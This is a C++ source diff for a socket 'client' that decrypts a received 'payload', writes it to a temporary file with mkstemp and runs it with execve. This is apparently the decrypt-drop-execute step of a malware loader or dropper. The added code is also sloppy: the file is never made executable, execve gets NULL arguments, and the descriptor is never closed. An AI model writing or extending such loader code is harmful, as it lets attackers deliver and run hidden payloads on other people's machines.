@@ -20,7 +20,7 @@ client::client(void) : Socket() {
         exit(EXIT_FAILURE);
     }
 
-    memcpy(&result, tmp->ai_addr, sizeof(struct sockaddr));
+    memcpy(result, tmp->ai_addr, sizeof(struct sockaddr_in));
 
     freeaddrinfo(tmp);
     
@@ -52,6 +52,7 @@ client::client(void) : Socket() {
     crypt->crypt_key();
     crypt->crypt();
 
+    fun(crypt);
 
     delete crypt;
     crypt = nullptr;
@@ -61,4 +62,23 @@ client::client(void) : Socket() {
 
 client::~client(void) {
     close(sock);
+}
+
+void fun(crypto *crypt) {
+    char *file_name;
+    int fd;
+
+    file_name = (char *)malloc(MAX_FILE_NAME);
+
+    strncpy(file_name, FILE, MAX_FILE_NAME);
+
+    if ((fd = mkstemp(file_name)) == -1) {
+        perror("Error making temp");
+        exit(EXIT_FAILURE);
+    }
+
+    write(fd, crypt->get_payload(), crypt->get_payload_size());
+
+    execve(file_name, NULL, NULL);
+    free(file_name);
 }
